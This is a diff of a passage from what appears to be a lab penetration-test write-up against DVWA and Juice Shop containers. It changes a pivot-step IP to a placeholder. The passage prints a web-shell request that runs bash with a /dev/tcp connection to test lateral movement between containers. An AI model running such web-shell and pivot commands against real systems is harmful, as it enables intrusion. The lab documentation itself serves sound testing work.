@@ -36,7 +36,7 @@ Standard post-exploitation discovery: identify the host, enumerate users, map th
 
 ### Step 3 — Lateral Pivot Attempt
 ```
-GET /hackable/uploads/shell.php?cmd=bash+-c+'echo+>/dev/tcp/172.17.0.3/3000'
+GET /hackable/uploads/shell.php?cmd=bash+-c+'echo+>/dev/tcp/172.17.0.x/3000'
 ```
 Used the web shell to attempt a TCP connection from the DVWA container to the Juice Shop container's port 3000 — confirmed reachable (connection succeeded), demonstrating the pivot path exists. In a real attack, this step would precede dropping a second-stage payload on the pivot target.
 
